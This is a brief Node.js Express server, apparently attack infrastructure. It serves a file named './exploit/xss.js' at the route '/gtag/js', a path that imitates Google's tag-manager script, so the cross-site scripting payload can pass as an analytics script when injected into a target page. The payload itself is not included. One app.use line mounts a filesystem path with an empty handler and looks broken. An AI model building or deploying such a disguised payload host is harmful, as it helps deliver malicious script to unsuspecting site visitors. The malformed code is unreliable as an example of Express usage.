const express = require("express");
const app = express();
const port = 3000;
const path = require("path");
app.use(path.join(__dirname, "./exploit"), () => {
  
});
/*
  */
app.get("/gtag/js", (req, res) => {
   res.sendFile(path.join(__dirname, "./exploit/xss.js"));
});

app.listen(process.env.port || port, () => {
   console.log('listening on', port);
});
